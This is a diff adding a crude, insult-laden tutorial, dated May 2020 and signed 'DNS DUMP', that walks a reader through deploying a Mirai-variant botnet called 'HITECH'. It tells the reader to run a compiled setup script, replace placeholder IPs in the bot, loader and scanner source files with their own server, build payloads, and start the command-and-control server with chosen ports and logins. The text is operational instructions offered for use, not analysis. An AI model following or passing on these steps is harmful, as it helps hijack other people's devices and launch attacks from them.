@@ -1,0 +1,33 @@
+I WAS DEBATING WHETHER OR NOT I SHOULD SELL THIS
+BUT I GAVE THIS TUT AWAY FOR FREE AND RELEASING FIXED VERSION OF HITECH
+YOUR WELCOME BITCH!
+THIS IS HOW TO SETUP THE GODDAMN BOATNET YURD ME
+JUST FOLLOW WHAT I PUT STEP-BY-STEP OR ELSE YOU WONT BE ABLE TO FUCKING REP 
+IGHT LISTEN STUPID
+TUT BY: DNS DUMP
+date madetut: May 13, 2020
+released date: May 19, 2020
+
+[MIRAI]
+TO MAKE IT EASIER FOR YOU IDIOTS I MADE THIS SCRIPT. I COMPILED IT SO YALL CAN'T TAKE THE CODE AND SKID RIP IT FOR YOURSELVES AND NO WORRIES NO BACKDOORS OR NOTHING
+YOULL CLEARLY SEE IT IF THERE IS. 
+JUST DO chmod 777 * then ./wip
+obviously install dependencies first. then download architectures. 
+then what you want to do is edit the ips in these following files. (just look for "0.0.0.0" and replace all the ips to your server ip)
+bot/main.c
+dlr/main.c
+loader/src/main.c
+loader/src/headers/config.h
+tools/scanListen.go
+
+now rerun my script ./wip
+once done. do ./payload
+type in your server ip and wallah done
+
+now just go into cnc directory by doing cd cnc
+then final command is screen ./cnc <bot-port> <threads> <cnc-port> 
+(botport is the port in the main.c right next to the ip)
+(cncport is the port you connect with)
+and don't forget to make your login in login.txt!
+
+I made this extrememly easy for everybody, your welcome. 
